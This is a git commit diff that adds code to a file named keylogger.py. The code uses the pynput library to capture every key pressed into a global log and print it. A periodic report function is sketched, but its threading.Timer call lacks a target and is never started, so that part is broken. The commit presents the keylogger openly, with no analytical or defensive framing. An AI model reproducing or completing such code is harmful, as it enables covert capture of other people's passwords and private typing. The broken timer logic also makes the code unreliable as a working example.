c7dad924f211b0ba964acfe3fe8967d343a1bea2
amarendra-singh <imamarendra.singh@gmail.com>
2019-03-27 18:13:35 +0530

    update

--- keylogger.py
+++ keylogger.py
@@ -1,3 +1,27 @@
 import pynput.keyboard
+import threading
 
-key
+log = ""
+
+def process_key_press(key):
+    global log
+    try:
+        log = log + str(key.char)
+    except AttributeError:
+        if key == key.space:
+            log = log + " "
+        else:
+            log = log + " " + str(key) + " "
+
+    print(log)
+
+def report():
+    global log
+    print(log)
+    log = ""
+    timer = threading.Timer(10)
+
+keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
+with keyboard_listener:
+    report()
+    keyboard_listener.join()
